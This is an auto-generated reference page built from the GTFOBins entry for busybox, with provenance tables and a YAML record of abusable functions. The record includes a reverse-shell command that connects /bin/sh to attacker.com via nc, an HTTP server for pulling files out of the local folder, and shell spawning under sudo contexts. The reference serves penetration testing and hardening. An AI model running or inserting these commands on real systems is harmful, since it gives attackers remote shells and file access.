---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# busybox

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `busybox` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [busybox](../../tools/linux/busybox.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | busybox |
| name | busybox |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/busybox/ |

## Preserved Source Material

```yaml
_body: ''
_name: busybox
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox
comment: BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.
functions:
  inherit:
  - code: busybox ash
    contexts:
      sudo: null
      unprivileged: null
    from: ash
  - code: busybox cat
    contexts:
      sudo: null
      unprivileged: null
    from: cat
  reverse-shell:
  - code: busybox nc -e /bin/sh attacker.com 12345
    contexts:
      sudo: null
      unprivileged: null
    listener: tcp-server
  upload:
  - code: busybox httpd -f -p 12345 -h .
    comment: This serves files in the local folder via an HTTP server.
    contexts:
      sudo: null
      unprivileged: null
    receiver: http-client
```
